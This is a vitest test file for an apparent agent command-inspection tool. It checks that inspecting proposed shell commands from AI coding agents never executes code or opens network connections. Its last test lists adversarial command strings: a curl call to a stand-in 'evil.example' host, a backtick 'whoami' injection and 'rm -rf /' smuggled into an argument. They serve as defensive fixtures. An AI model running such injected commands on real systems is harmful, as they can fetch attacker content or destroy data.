/**
 * Proof that inspection performs no execution and no network access.
 *
 * child_process, net, dns, http, and https are mocked to throw. If inspecting
 * any fixture (or an adapter run) touched one of them, the call would throw and
 * the test would fail. Because it does not, inspection is execution-free and
 * offline by construction.
 */

import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it, vi } from 'vitest';

const boom = (name: string) => () => {
  throw new Error(`forbidden call: ${name}`);
};

vi.mock('node:child_process', () => ({
  spawn: boom('child_process.spawn'),
  spawnSync: boom('child_process.spawnSync'),
  exec: boom('child_process.exec'),
  execSync: boom('child_process.execSync'),
  execFile: boom('child_process.execFile'),
  execFileSync: boom('child_process.execFileSync'),
  fork: boom('child_process.fork'),
  default: {},
}));

vi.mock('node:net', () => ({
  connect: boom('net.connect'),
  createConnection: boom('net.createConnection'),
  Socket: boom('net.Socket'),
  default: {},
}));

vi.mock('node:dns', () => ({
  lookup: boom('dns.lookup'),
  resolve: boom('dns.resolve'),
  default: {},
  promises: { lookup: boom('dns.promises.lookup'), resolve: boom('dns.promises.resolve') },
}));

vi.mock('node:http', () => ({
  request: boom('http.request'),
  get: boom('http.get'),
  default: {},
}));

vi.mock('node:https', () => ({
  request: boom('https.request'),
  get: boom('https.get'),
  default: {},
}));

const { inspect } = await import('../src/core/classify.js');
const { runClaudeCodeHook } = await import('../src/adapters/claude-code.js');
const { runCodexHook } = await import('../src/adapters/codex.js');
const { runCursorHook } = await import('../src/adapters/cursor.js');
const { runCopilotHook } = await import('../src/adapters/github-copilot.js');
const { recordDecision, readDecisionLog } = await import('../src/log/decision-log.js');
const { summarizeDecisions } = await import('../src/format/report.js');
const { shellCases, toolCases, fileChangeCases, shellRequest } = await import('./helpers/fixtures.js');

describe('no execution or network during inspection', () => {
  it('inspects every shell fixture without spawning or connecting', () => {
    for (const testCase of shellCases()) {
      expect(() => inspect(shellRequest(testCase.command)), testCase.name).not.toThrow();
    }
  });

  it('inspects every tool and file-change fixture safely', () => {
    for (const testCase of toolCases()) {
      expect(() =>
        inspect({ source: 'cli', mode: 'interactive', action: testCase.action }),
      ).not.toThrow();
    }
    for (const testCase of fileChangeCases()) {
      expect(() =>
        inspect({ source: 'cli', mode: 'interactive', action: testCase.action }),
      ).not.toThrow();
    }
  });

  it('runs every first-class adapter without execution or network', () => {
    const payload = JSON.stringify({ tool_name: 'Bash', tool_input: { command: 'aws ec2 run-instances' } });
    expect(() => runClaudeCodeHook(payload)).not.toThrow();
    expect(() => runCodexHook(payload)).not.toThrow();
    const cursorPayload = JSON.stringify({ tool_name: 'Shell', tool_input: { command: 'terraform apply' } });
    expect(() => runCursorHook(cursorPayload)).not.toThrow();
    const copilotPayload = JSON.stringify({ toolName: 'bash', toolArgs: { command: 'terraform apply' } });
    expect(() => runCopilotHook(copilotPayload, { mode: 'cloud' })).not.toThrow();
    const vscodePayload = JSON.stringify({
      tool_name: 'runTerminalCommand',
      tool_input: { command: 'terraform apply' },
    });
    expect(() => runCopilotHook(vscodePayload, { mode: 'vscode' })).not.toThrow();
  });

  it('records and reports decisions locally without execution or network', () => {
    const dir = mkdtempSync(join(tmpdir(), 'agent-cost-guard-safety-'));
    try {
      const env = { AGENT_COST_GUARD_LOG_FILE: join(dir, 'decisions.jsonl') };
      const request = shellRequest('terraform apply');
      expect(() => recordDecision(request, inspect(request), env)).not.toThrow();
      const log = readDecisionLog(env.AGENT_COST_GUARD_LOG_FILE);
      expect(summarizeDecisions(log.entries).total).toBe(1);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('inspect is total: it never throws on adversarial input', () => {
    const inputs = [
      'aws ec2 run-instances $(curl http://evil.example)',
      'aws s3 mb s3://`whoami`',
      "aws ec2 run-instances --user-data 'x; rm -rf /'",
      'terraform apply && aws ec2 run-instances || echo done',
      '"""unbalanced quotes',
      'a'.repeat(10000),
    ];
    for (const command of inputs) {
      expect(() => inspect(shellRequest(command))).not.toThrow();
    }
  });
});
